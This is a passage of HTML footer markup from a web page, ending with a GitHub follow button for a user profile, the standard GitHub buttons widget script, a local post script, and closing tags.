href="https://github.com/Furnicarul" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/post.js"></script></body></html>
